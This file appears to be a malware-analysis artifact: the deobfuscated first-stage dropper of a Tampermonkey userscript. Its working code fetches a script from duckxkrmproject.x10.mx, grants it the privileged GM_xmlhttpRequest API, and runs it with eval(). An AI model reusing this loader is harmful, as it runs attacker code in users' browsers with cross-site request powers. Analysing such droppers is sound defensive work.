/**
 * ObfFuncV2.deobf.js
 * Deobfuscated Remote Stage 1 for Auto_LaymaV2 Userscript
 * 
 * Truthful recovery of original dropper logic:
 * - Bridges Tampermonkey privileged GM_xmlhttpRequest API to window / unsafeWindow
 * - Fetches Stage 2 payload from duckxkrmproject.x10.mx with cache-busting timestamp
 * - Executes dynamic payload via eval()
 * 
 * Hash of original stage: e946e4f67e31f7710811e50729b5135515c1fda0d91b17e9798310a661c5569e
 */

(function () {
  "use strict";

  fetch("https://duckxkrmproject.x10.mx/layma.js?t=" + Date.now()).then(response => response.text()).then(code => {
    window.GM_xmlhttpRequest = GM_xmlhttpRequest;
    try {
      unsafeWindow.GM_xmlhttpRequest = GM_xmlhttpRequest;
    } catch (e) {}
    eval(code);
  }).catch(err => console.error("L\u1ED7i khi t\u1EA3i script:", err));
})();